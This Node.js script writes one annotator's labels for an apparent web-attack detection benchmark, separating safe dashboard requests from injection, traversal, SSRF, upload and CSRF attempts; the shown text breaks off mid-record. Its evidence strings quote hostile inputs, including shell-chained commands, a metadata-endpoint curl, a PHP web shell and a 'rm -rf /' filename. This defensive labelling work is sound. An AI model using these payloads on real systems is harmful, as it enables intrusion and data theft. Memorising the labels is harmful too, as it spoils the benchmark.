#!/usr/bin/env node
/**
 * annotator-b independent annotation builder.
 *
 * Reads ONLY model-inputs.jsonl. Every rule below encodes annotator-b's own
 * judgement of the request-side evidence (method/path/query/body/headers/auth).
 * No label file, no response field, no other annotator's output is consulted.
 *
 * Perspective: business-context + false-positive control.
 *  - a dangerous-looking string stored in a NOTE/DOC/RULE field is data, not execution
 *  - the same string placed in a query/path/URL slot that the server parses is an attempt
 *  - object ownership / role scope unknown => unknown, not a guess
 */
'use strict';

const fs = require('fs');
const path = require('path');

const ROOT = path.resolve(__dirname, '..');
const INPUT = path.join(ROOT, 'model-inputs.jsonl');
const OUT_JSONL = path.join(__dirname, 'model-b-annotations.jsonl');

const rows = fs
  .readFileSync(INPUT, 'utf8')
  .split(/\r?\n/)
  .filter((l) => l.trim() !== '')
  .map((l) => JSON.parse(l));

// ---------------------------------------------------------------- helpers ---
const ann = new Map(); // sampleId -> annotation

function put(sample, o) {
  const id = sample.sampleId;
  if (ann.has(id)) throw new Error(`duplicate assignment for ${id}`);
  const rec = {
    sampleId: id,
    annotatorId: 'annotator-b',
    verdict: o.verdict,
    attackFamily: o.attackFamily,
    recommendedAction: o.action,
    contextSufficient: o.ctx,
    confidence: o.conf,
    evidence: o.evidence,
    alternativeInterpretation: o.alt || '',
    rationale: o.rationale,
    needsExpertReview: false,
    reviewReason: '',
  };
  // Section 13: mandatory expert-review triggers.
  const reasons = [];
  if (rec.verdict === 'unknown') reasons.push('verdict=unknown');
  if (rec.confidence <= 2) reasons.push('confidence<=2');
  if (o.review) reasons.push(o.review);
  if (reasons.length) {
    rec.needsExpertReview = true;
    rec.reviewReason = reasons.join('; ');
  }
  ann.set(id, rec);
}

const num = (s) => parseInt(s.sampleId.replace(/^viguard-lan-0*/, ''), 10);
const byNum = new Map(rows.map((r) => [num(r), r]));

function forEachId(list, fn) {
  for (const n of list) {
    const s = byNum.get(n);
    if (!s) throw new Error(`missing sample ${n}`);
    fn(s, n);
  }
}
function range(a, b) {
  const out = [];
  for (let i = a; i <= b; i++) out.push(i);
  return out;
}

// Shared evidence fragments.
const AUTH_SESSION = 'sourceContext.authenticated=true (established tenant_admin session)';
const ANON = 'sourceContext.authenticated=false (no established session)';
const SAME_ORIGIN = 'Origin=http://192.168.3.140:5173 matches the target host (same-origin dashboard call)';
const ROLE_UNKNOWN =
  'role-permission-matrix.json only documents role tenant_admin; the acting principal of this specific request is not carried in the input';

// =========================================================================
// 1-2, 152, 413: /api/auth/login
// =========================================================================
forEachId([1, 2, 152], (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      'POST /api/auth/login with body {"email":"[TEST_ACCOUNT]","password":"[REDACTED_PASSWORD]"} — a single well-formed credential submission',
      SAME_ORIGIN,
      'no injection metacharacter, no enumeration pattern and no repetition burst within this single request',
    ],
    alt: 'Could be one probe of a credential-stuffing series, but a single request carries no per-account rotation or high-rate evidence.',
    rationale: '同源正常登录提交，凭据字段结构合法，无枚举或注入特征，属正常认证流程。',
  });
});

put(byNum.get(413), {
  verdict: 'unknown',
  attackFamily: 'unknown',
  action: 'challenge',
  ctx: false,
  conf: 2,
  evidence: [
    'POST /api/auth/login body {"email":"[TEST_ACCOUNT]"} — the password field is absent entirely',
    ANON,
    'a missing required credential field is equally consistent with a client-side validation bug and with a deliberate auth-logic probe (does the server authenticate on email alone)',
  ],
  alt: 'Benign malformed client submission where the password input was simply empty.',
  rationale: '登录体缺 password 字段，正常客户端缺陷与认证逻辑绕过探测两种解释均成立，需服务端校验语义方可判定。',
  review: 'missing-required-credential-field: benign client bug vs auth-logic probe both plausible',
});

// =========================================================================
// 3-34: authenticated baseline dashboard reads
// =========================================================================
forEachId(range(3, 34), (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} with no query parameters and body=null`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'endpoint-inventory.json lists this path under endpointsProbed as a standard dashboard read route',
    ],
    alt: 'A compromised session could issue the same read, but nothing in the request itself deviates from normal dashboard loading.',
    rationale: '已认证同源的无参列表/详情读取，属仪表盘常规加载，无任何操纵或越界特征。',
  });
});

// =========================================================================
// 35-82: pagination sweeps (page/limit/offset within sane bounds)
// =========================================================================
forEachId(range(35, 82), (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} — only page/limit/offset pagination parameters with plain integer values`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'values stay within ordinary UI paging ranges (limit<=100), no negative/oversized bound and no injected operator',
    ],
    alt: 'Sequential paging can also be the first step of bulk harvesting, but per-request the values are ordinary UI page sizes.',
    rationale: '标准分页参数取值正常，属列表翻页读取，无越界或注入迹象。',
  });
});

// =========================================================================
// 83-122: benign search/filter/sort terms on list endpoints
// =========================================================================
forEachId(range(83, 122), (s) => {
  const isAdminUsers = s.input.path.startsWith('/api/admin/users');
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: isAdminUsers ? 'monitor' : 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} — search/q/filter/sort value is an ordinary business term or ISO date, containing no SQL operator, tag or traversal sequence`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      isAdminUsers
        ? 'target is the user-directory listing, a sensitive-but-authorized read for an administrative role'
        : 'target is a tenant-scoped alert/agent/device/log listing that the tested role is documented as allowed to read',
    ],
    alt: isAdminUsers
      ? 'Repeated directory searches could be reconnaissance, but each individual term here is a normal lookup keyword.'
      : 'Search terms could seed later enumeration, but no malicious token is present in this request.',
    rationale: isAdminUsers
      ? '普通关键词检索用户目录，语法合法且属管理读操作，仅因目录敏感建议留痕监控。'
      : '普通业务关键词检索，无注入语法，属列表筛选正常用法。',
  });
});

// =========================================================================
// 123-127: single-resource reads by an opaque resource id
// =========================================================================
forEachId(range(123, 127), (s) => {
  put(s, {
    verdict: 'unknown',
    attackFamily: 'unknown',
    action: 'challenge',
    ctx: false,
    conf: 2,
    evidence: [
      `GET ${s.input.path} — a single opaque resource identifier with no query parameters`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      `ownership of the referenced object is not observable in the request; ${ROLE_UNKNOWN}`,
    ],
    alt: 'Most likely a normal detail-view click on a record the session already owns.',
    rationale: '按 ID 读取单条资源，请求本身无法证明该对象归属当前租户，越权与正常详情读均成立。',
    review: 'object ownership unknown: direct object reference could be in-scope detail view or IDOR',
  });
});

// =========================================================================
// 128-132: tenant-oversight (cross-tenant scope) reads
// =========================================================================
forEachId(range(128, 132), (s) => {
  put(s, {
    verdict: 'unknown',
    attackFamily: 'authorization',
    action: 'challenge',
    ctx: false,
    conf: 2,
    evidence: [
      `GET ${s.input.path} — a cross-tenant oversight resource (tenant list / per-tenant summary, timeline, evidence, exports)`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'role-permission-matrix.json documents GET /api/admin/tenant-oversight/tenants as denied for the tested tenant_admin role, so this scope sits outside that role',
      'the input does not state which principal issued this request, so a legitimately-scoped superadmin call cannot be excluded',
    ],
    alt: 'A superadmin/oversight-privileged operator performing an authorized cross-tenant review would issue an identical request.',
    rationale: '访问跨租户监管资源，该范围对已记录角色为拒绝；但请求未携带实际主体角色，越权与合法监管无法区分。',
    review: 'cross-tenant oversight scope with unknown acting role: privilege boundary cannot be resolved from the request',
  });
});

// 133: duplicate benign read
put(byNum.get(133), {
  verdict: 'safe',
  attackFamily: 'none',
  action: 'allow',
  ctx: true,
  conf: 4,
  evidence: [
    'GET /api/scanner/benchmarks/history with no parameters and body=null',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    'endpoint-inventory.json lists /api/scanner/benchmarks/history among probed read endpoints',
  ],
  alt: 'None materially different; this is a plain history read.',
  rationale: '无参读取扫描基准历史，属常规查看操作。',
});

// =========================================================================
// 134-139: benign alert/device workflow actions with a plain note
// =========================================================================
forEachId(range(134, 139), (s) => {
  const isConfirm = s.input.path.includes('confirm-required-action');
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: isConfirm ? 'monitor' : 'allow',
    ctx: true,
    conf: isConfirm ? 3 : 4,
    evidence: [
      `POST ${s.input.path} with body {"note":"TEST_PERSON_001 AETHER_CANARY benign ack test"} — a plain free-text note, no operator or markup`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      isConfirm
        ? 'the endpoint confirms a required device action, so it is a state-changing operational step rather than a read'
        : 'acknowledge/resolve/suppress/block/investigate are the documented SOC triage transitions on an alert',
    ],
    alt: isConfirm
      ? 'Whether this specific device action is within the session role scope is not visible, though the payload itself is innocuous.'
      : 'None; the note field contains only descriptive text.',
    rationale: isConfirm
      ? '设备必需动作确认，备注为纯文本无恶意载荷，属正常运维确认，因涉及状态变更建议监控。'
      : '告警处置动作携带纯文本备注，属 SOC 常规工单流转。',
  });
});

// =========================================================================
// 140-147: repeat baseline reads; 148-150 unauthenticated health probes
// =========================================================================
forEachId(range(140, 147), (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} with no query parameters and body=null`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'a repeat of the standard dashboard/session polling reads listed in endpoint-inventory.json',
    ],
    alt: 'None; identical in shape to routine dashboard polling.',
    rationale: '已认证同源常规状态读取，属仪表盘轮询。',
  });
});

forEachId([148, 149, 150], (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} — a liveness/readiness health endpoint designed to be reachable without a session`,
      `${ANON}; ${SAME_ORIGIN}`,
      'no parameters, no body, and the path is outside the /api data surface',
    ],
    alt: 'Health endpoints are also touched during reconnaissance, but they expose no tenant data by design.',
    rationale: '未认证探测健康检查端点，该端点设计即为免鉴权存活探测，不暴露业务数据。',
  });
});

// 151: authenticated same-origin logout
put(byNum.get(151), {
  verdict: 'safe',
  attackFamily: 'none',
  action: 'allow',
  ctx: true,
  conf: 4,
  evidence: [
    'POST /api/auth/logout with body=null',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    'session termination initiated from the application origin itself',
  ],
  alt: 'None; this is the ordinary sign-out call.',
  rationale: '同源已认证注销请求，属正常会话结束。',
});

// =========================================================================
// 153-162, 166-167: SQLi payloads in a parsed query/path slot
// =========================================================================
forEachId([...range(153, 162)], (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'sqli',
    action: 'block',
    ctx: true,
    conf: 5,
    evidence: [
      `GET ${s.input.path} — the search parameter carries SQL syntax (quote-break plus OR/UNION/DROP/SLEEP or a stacked statement) rather than a business term`,
      'the value sits in a query parameter that the listing endpoint consumes as a filter input, i.e. an execution-adjacent position, not a stored note',
      `${AUTH_SESSION}; ${SAME_ORIGIN} — an authenticated principal is probing its own tenant surface`,
    ],
    alt: 'A researcher testing their own instance would send the identical bytes; intent is still injection probing, so the label does not change.',
    rationale: '检索参数被填入引号闭合加布尔/联合/延时等SQL语法，位于服务端解析位置，属注入尝试。',
  });
});

forEachId([166, 167], (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'sqli',
    action: 'block',
    ctx: true,
    conf: 5,
    evidence: [
      `GET ${s.input.path} — the resource-id path segment is a URL-encoded SQL clause (' OR '1'='1 / ' OR 1=1-- -) instead of an identifier`,
      'the segment is the route parameter used to look the record up, so the payload targets the lookup predicate directly',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'None plausible: an identifier slot has no legitimate reason to hold SQL boolean syntax.',
    rationale: '路径 ID 段被替换为SQL恒真子句，直指查询谓词，属明确注入尝试。',
  });
});

// 163-165: SQL payload in a stored note/filter field of an alert action
forEachId([163, 164, 165], (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'sqli',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `POST ${s.input.path} with body ${s.input.body} — both note and filter hold bare SQL clauses with no surrounding sentence or ticket reference`,
      'the accompanying "filter" key names a query-shaping input, so the payload is aimed at a parsed field rather than at documentation text',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'If the backend stores both fields verbatim and never parses "filter", this would only be junk data — but the field name and the bare-clause form point at injection probing.',
    rationale: '告警处置体的 note/filter 填入裸SQL子句且无业务叙述，filter 字段名指向解析位置，判为注入尝试。',
    review: 'field could be stored-only rather than parsed; execution position for "filter" is not observable from the request',
  });
});

// =========================================================================
// 168-175: XSS payloads in a note field; 176-177 in a query parameter
// =========================================================================
forEachId(range(168, 175), (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'xss',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `POST ${s.input.path} with body ${s.input.body} — the note field holds a bare script/event-handler payload (script tag, onerror/onload, javascript: URI) and nothing else`,
      'there is no ticket id, sentence or documentation framing that would make this a security write-up; the value is only the executable fragment',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'The note may be rendered escaped and never execute, but a payload-only note on a triage action is a stored-XSS probe rather than an operational remark.',
    rationale: '处置备注仅含裸脚本/事件处理器载荷且无业务叙述，属存储型XSS尝试。',
    review: 'stored-note field may be output-escaped; data-vs-execution position not observable from the request',
  });
});

forEachId([176, 177], (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'xss',
    action: 'block',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${s.input.path} — the search parameter is a URL-encoded script tag / img-onerror payload`,
      'the value occupies a search input whose result is echoed back into the listing UI, a reflected-output position',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'Could be a benign search for the literal string, but the payload is a complete executable tag rather than a keyword.',
    rationale: '检索参数为完整可执行标签载荷，指向反射输出位置，属XSS尝试。',
  });
});

// =========================================================================
// 178-185: command injection in a "cmd" field of a device action
// =========================================================================
forEachId(range(178, 185), (s) => {
  const ssrfFlavour = s.input.body.includes('169.254.169.254');
  put(s, {
    verdict: 'attack',
    attackFamily: 'command_injection',
    action: 'isolate',
    ctx: true,
    conf: 5,
    evidence: [
      `POST ${s.input.path} with body ${s.input.body} — the payload uses shell metacharacters (;, |, &&, backtick, $()) to append a second command`,
      'the value is placed in a field explicitly named "cmd" on a device action endpoint, i.e. a field whose name asserts an execution position',
      ssrfFlavour
        ? 'the appended command curls the 169.254.169.254 cloud-metadata address, showing credential-reach intent beyond mere command execution'
        : 'the appended command (cat /etc/passwd, id, whoami, netstat, nc -l 4444, dir) performs host reconnaissance or opens a listener',
    ],
    alt: 'If the backend never shells out, the string would be inert — but the "cmd" field name plus chained shell syntax is an execution attempt regardless of outcome.',
    rationale: '设备动作 cmd 字段被注入shell元字符与追加命令，指向主机执行位置，属命令注入尝试。',
  });
});

// =========================================================================
// 186-192: path traversal in the resource-id segment of a download route
// 193-194: path traversal in a "file" query parameter
// =========================================================================
forEachId(range(186, 192), (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'path_traversal',
    action: 'block',
    ctx: true,
    conf: 5,
    evidence: [
      `GET ${s.input.path} — the identifier segment of a /download route is a traversal sequence targeting /etc/passwd, /var/log/auth.log or windows/win.ini`,
      'the request uses layered evasion encodings (%2F, %5C, ....//, %252e / %25252f double-encoding) whose only purpose is to defeat path normalisation',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'None plausible: a device identifier has no legitimate form containing dot-dot sequences or absolute system paths.',
    rationale: '下载路由的ID段为多重编码的目录穿越序列指向系统敏感文件，属穿越读取尝试。',
  });
});

forEachId([193, 194], (s) => {
  put(s, {
    verdict: 'attack',
    attackFamily: 'path_traversal',
    action: 'block',
    ctx: true,
    conf: 5,
    evidence: [
      `GET ${s.input.path} — the "file" query parameter holds an encoded ../../../ sequence resolving to /etc/passwd or windows/win.ini`,
      'the parameter name "file" designates a filesystem-selection input, so the traversal targets the file-resolution logic directly',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'None plausible; a log-file selector has no legitimate value escaping its base directory.',
    rationale: 'file 参数为编码后的穿越路径指向系统文件，直击文件解析逻辑，属穿越尝试。',
  });
});

// =========================================================================
// 195-200: SSRF payloads in scanner target/url/webhook
// =========================================================================
forEachId(range(195, 200), (s) => {
  const b = s.input.body;
  let why;
  if (b.includes('169.254.169.254')) why = 'the target is the cloud instance-metadata address 169.254.169.254, a canonical credential-theft destination';
  else if (b.includes('file://')) why = 'the target uses the file:// scheme to reach /etc/passwd on the server filesystem, outside any HTTP scanning purpose';
  else if (b.includes('gopher://')) why = 'the target uses the gopher:// scheme against 127.0.0.1:6379, a protocol-smuggling technique for driving internal Redis';
  else if (b.includes('localhost:6379')) why = 'the target is the server-local Redis port 6379, an internal service the scanner has no business reaching';
  else if (b.includes('192.168.3.1/admin')) why = 'the target is the LAN gateway admin interface 192.168.3.1/admin, an internal device outside the scanned application';
  else why = 'the target points at an external listener on 192.168.3.107:9999 with an ssrf-canary path, i.e. an out-of-band callback probe';
  put(s, {
    verdict: 'attack',
    attackFamily: 'ssrf',
    action: 'block',
    ctx: true,
    conf: 5,
    evidence: [
      `POST /api/scanner with body ${b} — target, url and webhook are all set to the same non-application destination`,
      why,
      'the fields are server-side fetch inputs, so the value directs the backend to originate the request rather than merely storing a string',
    ],
    alt: 'A scanner legitimately accepts URLs, but internal-only, link-local and non-HTTP schemes are outside any legitimate scan scope.',
    rationale: '扫描目标被指向元数据地址/内网服务/file/gopher等非应用目的地，驱动服务端外发请求，属SSRF尝试。',
  });
});

// =========================================================================
// 201: unauthenticated /api/auth/me
// =========================================================================
put(byNum.get(201), {
  verdict: 'safe',
  attackFamily: 'none',
  action: 'monitor',
  ctx: true,
  conf: 3,
  evidence: [
    'GET /api/auth/me with no parameters and body=null',
    `${ANON}; ${SAME_ORIGIN}`,
    'an unauthenticated session-identity check is the standard way a SPA discovers that it must redirect to login',
  ],
  alt: 'The same call is also how an attacker checks whether a stolen cookie is still valid, so it warrants logging.',
  rationale: '未认证调用身份查询端点，属前端判断登录态的常规首次请求，无载荷，仅建议留痕。',
});

forEachId([202, 203], (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'allow',
    ctx: true,
    conf: 4,
    evidence: [
      'GET /api/auth/me with no parameters and body=null',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'routine session-identity poll issued by the dashboard',
    ],
    alt: 'None; identical to normal session polling.',
    rationale: '已认证同源身份查询，属会话状态轮询。',
  });
});

// =========================================================================
// 204-209: reads of other principals'/objects' ids (IDOR candidates)
// =========================================================================
forEachId(range(204, 209), (s) => {
  const isUser = s.input.path.startsWith('/api/admin/users/');
  put(s, {
    verdict: 'unknown',
    attackFamily: 'idor_bola',
    action: 'challenge',
    ctx: false,
    conf: 2,
    evidence: [
      `GET ${s.input.path} — a direct object reference to a specific ${isUser ? 'user account' : 'device'} record`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'the request carries no evidence of whether the referenced object belongs to the caller tenant; three distinct ids are read in sequence, which is consistent with both a UI drill-down and horizontal enumeration',
      ROLE_UNKNOWN,
    ],
    alt: 'A legitimate administrator opening three records from a list view produces exactly this sequence.',
    rationale: '按ID直读他方用户/设备记录，请求无法证明对象归属，横向越权与正常查看均成立。',
    review: 'IDOR/BOLA candidate: object ownership and caller tenant scope not derivable from the request',
  });
});

// =========================================================================
// 210-212: privilege escalation / cross-tenant export
// =========================================================================
put(byNum.get(210), {
  verdict: 'attack',
  attackFamily: 'authorization',
  action: 'block',
  ctx: true,
  conf: 4,
  evidence: [
    'PUT /api/admin/users/[RESOURCE_ID_727DAE3A]/role with body {"role":"superadmin"} — a write that raises an account to the highest privilege tier',
    'role-permission-matrix.json records PUT /api/admin/users/:id/role as denied for the tested tenant_admin role, so this call targets a boundary the tested role does not hold',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
  ],
  alt: 'A superadmin performing an authorized promotion would send the same request; the acting role is not carried in the input, though the target value is the maximal privilege tier.',
  rationale: '将账户角色提升至 superadmin 的写操作，落在已记录角色被拒的权限边界上，判为提权尝试。',
  review: 'acting principal role not carried in the request; legitimate superadmin promotion cannot be fully excluded',
});

put(byNum.get(211), {
  verdict: 'unknown',
  attackFamily: 'business_logic',
  action: 'challenge',
  ctx: false,
  conf: 2,
  evidence: [
    'PUT /api/admin/users/[RESOURCE_ID_727DAE3A]/plan with body {"plan":"enterprise"} — a subscription-tier change on an account',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    'plan upgrades are a normal billing/administration operation, so the request is only abusive if self-service tier escalation is not permitted for the caller — which the input does not state',
    ROLE_UNKNOWN,
  ],
  alt: 'An administrator provisioning an enterprise plan for a customer issues an identical call.',
  rationale: '修改账户订阅套餐为 enterprise，属常规计费管理动作；是否越权取决于调用者权限与自助升级策略，请求无法判定。',
  review: 'business-logic tier change: legitimacy depends on caller entitlement and self-service upgrade policy',
});

put(byNum.get(212), {
  verdict: 'attack',
  attackFamily: 'authorization',
  action: 'block',
  ctx: true,
  conf: 4,
  evidence: [
    'POST /api/admin/tenant-oversight/exports with body {"tenantId":"[TENANT_ID_4E8A855E]"} — requests a bulk data export scoped to a named tenant',
    'role-permission-matrix.json records POST /api/admin/tenant-oversight/exports as denied for the tested tenant_admin role',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
  ],
  alt: 'An oversight-privileged operator running a compliance export would issue the same call; the acting role is not carried in the input.',
  rationale: '对指定租户发起批量数据导出，落在已记录角色被拒的监管边界上，判为越权取数尝试。',
  review: 'acting principal role not carried in the request; authorized oversight export cannot be fully excluded',
});

// =========================================================================
// 213-214: malicious firmware upload
// =========================================================================
put(byNum.get(213), {
  verdict: 'attack',
  attackFamily: 'file_upload',
  action: 'isolate',
  ctx: true,
  conf: 5,
  evidence: [
    'POST /api/devices/firmware with body {"filename":"../../../webshell.php","content":"<?php system($_GET[\\"c\\"]); ?>"}',
    'the filename combines directory traversal with a .php extension, aiming the write outside the upload directory into a script-executable path',
    'the content is a complete PHP web shell passing a query parameter straight to system(), i.e. remote command execution once served',
  ],
  alt: 'None plausible: no firmware artefact is a PHP file, and no legitimate upload needs a traversal prefix.',
  rationale: '固件上传的文件名为穿越路径加.php，内容是直调system()的PHP webshell，属植入远程执行后门。',
});

put(byNum.get(214), {
  verdict: 'attack',
  attackFamily: 'file_upload',
  action: 'block',
  ctx: true,
  conf: 4,
  evidence: [
    'POST /api/devices/firmware with body {"filename":"firmware.exe; rm -rf /","content":"MZ"}',
    'the filename embeds a shell command separator followed by a destructive rm -rf /, targeting any downstream code that passes the name to a shell',
    'the content is only the two-byte MZ stub, so the payload value is in the filename, not in a real firmware image',
  ],
  alt: 'None plausible: a shell separator plus rm -rf / has no legitimate place in a filename.',
  rationale: '上传文件名内嵌命令分隔符与rm -rf /破坏命令，指向下游shell拼接，属恶意上传兼命令注入尝试。',
});

// =========================================================================
// 215-216: cross-origin requests from an attacker-controlled origin
// =========================================================================
put(byNum.get(215), {
  verdict: 'attack',
  attackFamily: 'csrf',
  action: 'block',
  ctx: true,
  conf: 4,
  evidence: [
    'POST /api/auth/logout with Origin=http://evil-20260729.example.test while sourceContext.authenticated=true',
    'the Origin does not match the application host 192.168.3.140:5173, so a third-party site is driving a state-changing POST on an authenticated session',
    'the body is an empty object {}, characteristic of a forged cross-site form/fetch rather than a dashboard action',
  ],
  alt: 'A misconfigured internal tool could send a stale Origin, but a foreign origin issuing an authenticated state change is the definition of a CSRF attempt.',
  rationale: '来自外部 evil 源的跨站已认证状态变更请求，Origin 与应用主机不符，属CSRF尝试。',
  review: 'cross-origin state change: whether the server enforces SameSite/CSRF tokens is not observable from the request',
});

put(byNum.get(216), {
  verdict: 'attack',
  attackFamily: 'cors',
  action: 'block',
  ctx: true,
  conf: 4,
  evidence: [
    'GET /api/auth/me with Origin=http://evil-20260729.example.test while sourceContext.authenticated=true',
    'a foreign origin is reading the session-identity endpoint, which probes whether CORS lets an attacker page read authenticated responses',
    'the target endpoint returns account identity, so a permissive Access-Control-Allow-Origin here would leak session data cross-site',
  ],
  alt: 'Could be a developer testing CORS from a scratch host, but the origin is attacker-shaped and the endpoint is identity-bearing.',
  rationale: '外部源跨域读取身份端点，探测CORS是否允许攻击者页面读取已认证响应，属跨域配置探测。',
  review: 'cross-origin read probe: the server CORS policy is not observable from the request, so impact cannot be confirmed',
});

// =========================================================================
// 217-221: boundary / malformed parameter probing
// =========================================================================
put(byNum.get(217), {
  verdict: 'safe',
  attackFamily: 'none',
  action: 'monitor',
  ctx: true,
  conf: 3,
  evidence: [
    'GET /api/agents?limit=0 — a boundary value on the page-size parameter',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    'limit=0 is a legal edge case for a paging control and requests no data at all, so it cannot exfiltrate or manipulate state',
  ],
  alt: 'Boundary values are also used to map validation behaviour, hence monitoring rather than plain allow.',
  rationale: '分页 limit 取边界值0，不返回数据也不改状态，属边界输入，建议留痕。',
});

forEachId([218, 219], (s) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 3,
    evidence: [
      `GET ${s.input.path} — an oversized page-size request (limit=1000/2000) on a list endpoint`,
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
      'the value is a plain integer with no injected syntax; an authorized bulk export or report job legitimately asks for large pages',
    ],
    alt: 'Large limits are also the shape of bulk harvesting or a resource-exhaustion probe, so the request deserves rate/volume monitoring.',
    rationale: '请求超大分页尺寸但参数为纯整数，可能是批量导出，也可能是批量抓取，按可疑量级监控。',
  });
});

put(byNum.get(220), {
  verdict: 'unknown',
  attackFamily: 'business_logic',
  action: 'challenge',
  ctx: false,
  conf: 2,
  evidence: [
    'POST /api/alerts/[RESOURCE_ID_727DAE3A]/acknowledge with body {"status":"invalid_state","severity":-999}',
    'the body sets a state value outside any documented enum and a negative severity, i.e. it targets state-machine and range validation rather than carrying an injection payload',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
  ],
  alt: 'A buggy client or a malformed automation could send the same out-of-range values without malicious intent.',
  rationale: '处置请求写入非法状态枚举与负严重度，指向状态机与范围校验；恶意逻辑操纵与客户端缺陷都成立。',
  review: 'business-logic/state-machine probing vs client defect indistinguishable without server validation semantics',
});

put(byNum.get(221), {
  verdict: 'safe',
  attackFamily: 'none',
  action: 'monitor',
  ctx: true,
  conf: 3,
  evidence: [
    'GET /api/agents?page=-1&limit=-50 — negative pagination values',
    `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    'the values are plain negative integers with no injected syntax; negative paging is a validation edge case that returns no additional scope by itself',
  ],
  alt: 'Negative bounds are a classic way to test for offset-arithmetic flaws, so this is logged rather than silently allowed.',
  rationale: '分页参数取负值，属校验边界输入，无注入语法且不扩大数据范围，建议留痕监控。',
});

// =========================================================================
// 222-257, 294-303: security-term searches (hard negatives)
// =========================================================================
const searchTermHardNegatives = [...range(222, 257), ...range(294, 303)];
forEachId(searchTermHardNegatives, (s) => {
  const p = s.input.path;
  const isAudit = p.startsWith('/api/admin/audit/logs');
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 4,
    evidence: [
      `GET ${p} — the value sits in a search parameter of a ${isAudit ? 'audit-log' : 'alert/log'} listing, i.e. a corpus-lookup field, and is used to find records that mention the term`,
      'searching a security console for attack terminology (SQL injection, XSS payload, SSRF, DROP TABLE, webshell, eval(, 169.254.169.254, prompt-injection wording) is the core daily workflow of a SOC analyst',
      `${AUTH_SESSION}; ${SAME_ORIGIN}`,
    ],
    alt: 'The same string could be an injection attempt if the search field were concatenated into a query, but the value is a descriptive phrase rather than a syntactically complete injection.',
    rationale: '在安全控制台检索攻击术语属分析员日常工作，值为描述性词组而非可执行语法，判为易误报的正常检索。',
    review: 'hard negative: security terminology in a search field must not be classified on keyword match alone',
  });
});

// =========================================================================
// 258-269: SOC operational notes referencing payloads (hard negatives)
// =========================================================================
const socNoteKind = {
  258: 'an incident report stating that an inbound SQLi pattern was detected from 10.0.0.5 and blocked at the WAF',
  259: 'a WAF rule proposal describing the regex to add in order to mitigate reflected XSS',
  260: 'a runbook instruction on what to do when SSRF is detected (isolate host, alert SOC)',
  261: 'a training document stating that traversal payloads must be normalised before file access',
  262: 'an administrative task note referencing an approved change ticket CHG-20260729 for a staged rollout',
  263: 'a read-only log query written out as documentation of what was counted',
  264: 'a threat-intel note describing how a new CVE abuses command injection in backup agents',
  265: 'a false-positive review concluding that the quoted string came from a blog post and must not be blocked',
  266: 'a pen-test result recording that no SQLi was found because queries are parameterised',
  267: 'a detection-rule description qualifying when a UNION SELECT match should be treated as suspicious',
  268: 'a knowledge-base entry explaining that javascript: URIs are an XSS vector and must be sanitised on output',
  269: 'a SOC note identifying 169.254.169.254 as the cloud metadata endpoint that should be egress-blocked',
};
forEachId(range(258, 269), (s, n) => {
  put(s, {
    verdict: 'safe',
    attackFamily: 'none',
    action: 'monitor',
    ctx: true,
    conf: 4,
    evidence: [
      `POST ${s.input.path} with body ${s.input.body}`,
      `the note is ${socNoteKind[n]} — a complete operational sentence that quotes a payload as an example, accompanied by a SEC-REV ticket reference`,
      `${AUTH_SESSION}; ${SAME_ORIGIN} — an alert-triage action where free-text documentation is the expected content`,
    ],
    alt: 'A dangerous string is present, but it is embedded in narrative prose destined for storage and display, not placed in a parsed or executed field.',
